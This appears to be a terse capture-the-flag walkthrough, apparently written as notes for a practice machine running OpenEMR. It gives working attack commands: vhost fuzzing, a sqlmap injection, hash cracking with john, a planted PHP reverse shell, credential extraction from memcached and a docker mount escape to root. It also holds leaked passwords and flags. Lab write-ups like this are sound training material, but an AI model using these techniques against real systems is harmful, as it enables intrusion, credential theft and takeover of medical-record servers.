@@ -1,0 +1,89 @@
+nmap -sC -sV -oN nmap 10.10.10.188 -v -A
+
+80 -> login page
+
+verification is client side
+-> ash:H@v3_fun
+does not work with ssh -> seems like a rabbit hole
+
+cache.htb does not work
+-> lets try to find the right one with words from page
+
+intrudr attack on http://10.10.10.188 and in header:
+host: $guess$.htb
+with $guess$ the payload with words
+
+tooooo slow
+wfuzz -H "Host: FUZZ.htb" -w words --hh=8193 --hc=400 http://10.10.10.188
+-> HMS
+
+redirection to 404: /interface/login/login.php?site=default
+wfuzz again on ?site=FUZZ but nothing
+
+try to replace 10.10.10.188 in redirection too:
+it works!
+broken page -> add 10.10.10.188     hms.htb in /etc/hosts
+
+bypass login page:
+https://www.youtube.com/watch?v=DJSQ8Pk_7hc
+
+use request file
+sqlmap -r openemr.req --threads=10 --dbs
+
+username: openemr_admin
+password: $2a$05$l2sTLIG6GTBeyBf7TAKL6.ttEwJDmxs9bI6LXqlfCpEcY6VF6P0B.
+salt: $2a$05$l2sTLIG6GTBeyBf7TAKL6A$
+
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+-> xxxxxx
+
+login with openemr_admin:xxxxxx
+
+now can use authenticated rce exploit:
+OpenEMR < 5.0.1 - (Authenticated) Remote Code Execution     | php/webapps/45161.py
+-> do not understand how to use it
+
+http://hms.htb/interface/main/tabs/main.php
+change config.php in revshell.php -> go to default page
+-> shell as www-data
+
+/var/www/hms.htb/public_html/sql/defaults.sql
+INSERT INTO `users` VALUES (1, 'admin', '9d4e1e23bd5b727046a9e3b4b7db57bd8d6ee684', 1, NULL, NULL, 'Admin', NULL, 'Administrator', '', NULL, '');
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+su ash -> H@v3_fun
+
+user flag:
+23dcde97743a826b01cdfccc057f7cba
+
+lets become luffy now
+some enumeration
+
+then netstat -tulpn:
+-> port 11211 is listening = memcached
+
+nc 127.0.0.1 11211 fails but telnet works
+> stats items
+> stats cachedump 0 1
+ITEM link [21 b; 0 s]
+ITEM user [5 b; 0 s]
+ITEM passwd [9 b; 0 s]
+ITEM file [7 b; 0 s]
+ITEM account [9 b; 0 s]
+> get user
+luffy
+> get passwd
+0n3_p1ec3
+
+su luffy with 0n3_p1ec3
+enum -> docker
+
+docker images
+REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+ubuntu              latest              2ca708c1c9cc        8 months ago        64.2MB
+
+gtfobins
+-> docker run -v /:/mnt --rm -it ubuntu chroot /mnt sh
+
+shell as root
+5e6955910e3234c843c3d1f12a89ea71
